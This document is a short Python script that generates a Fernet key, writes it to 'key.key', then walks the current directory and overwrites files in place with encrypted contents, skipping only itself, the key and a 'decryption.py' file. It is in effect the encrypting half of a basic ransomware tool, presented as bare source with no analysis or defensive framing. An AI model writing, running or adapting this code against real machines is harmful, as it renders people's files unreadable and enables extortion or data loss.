import os
import os.path
from cryptography.fernet import Fernet


files = []
key = Fernet.generate_key()

with open('key.key','wb') as thekey:
    thekey.write(key)

for Root,Folders,Files in os.walk(os.getcwd()):
    for file in Files:
       if file == __file__ or file == 'key.key' or file == 'decryption.py':
          continue
       if os.path.isfile(file):
          files.append(os.path.join(Root,file))


for file in files:
    with open(file,'rb') as thefile:
        contents=thefile.read()
    encrypted_content=Fernet(key).encrypt(contents)
    with open(file,'wb') as thefile:
        thefile.write(encrypted_content)
